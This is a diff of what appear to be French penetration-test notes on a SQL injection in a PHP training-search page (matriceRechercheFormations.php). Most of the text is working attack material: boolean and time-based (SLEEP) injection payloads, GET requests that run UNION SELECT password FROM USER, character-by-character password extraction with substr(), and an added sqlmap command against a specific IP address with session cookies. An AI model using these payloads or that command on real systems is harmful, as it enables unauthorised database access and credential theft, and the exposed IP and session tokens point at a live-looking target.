@@ -41,7 +41,10 @@ Fichier: matriceRechercheFormations.php (appelé par le fichier resultatRecherch
 ![[Pasted image 20260421103726.png]]
 ```
 SELECT DISTINCT s.idSalarie FROM SALARIE s, FORMATION f WHERE s.idSalarie = f.employe AND s.archive = 0
-  AND (f.employe IN (SELECT employe FROM FORMATION WHERE archive = 0 AND nom_formation = 10)) UNION SELECT CASE WHEN (SELECT substr(username,1,1) FROM `USER` WHERE password='test' LIMIT 1)='t' THEN 1 ELSE 0 END-- 
+  AND (f.employe IN (SELECT employe FROM FORMATION WHERE archive = 0 AND nom_formation = 10)) AND SLEEP(5)
+  
+  
+  
   
   GET /matriceRechercheFormations.php?formations=10))+UNION+SELECT+password+FROM+USER--+ 
   
@@ -55,6 +58,8 @@ SELECT DISTINCT s.idSalarie FROM SALARIE s, FORMATION f WHERE s.idSalarie = f.em
 
 UNION+SELECT+(SELECT+substr(password,1,1)+FROM+`USER`+WHERE+username='test'+LIMIT+1)
 UNION SELECT substr(password,1,1) FROM `USER` WHERE username='test' LIMIT 1--+
+
+sqlmap -u http://3.76.169.95//matriceRechercheFormations.php?formations=1 --cookie="PHPSESSID=cf53a39be55e31ebd026412beabf74c8; sessionPeragus=cefe9540931990ca02592379a92e7f27; id=1" 
 
 ```
 
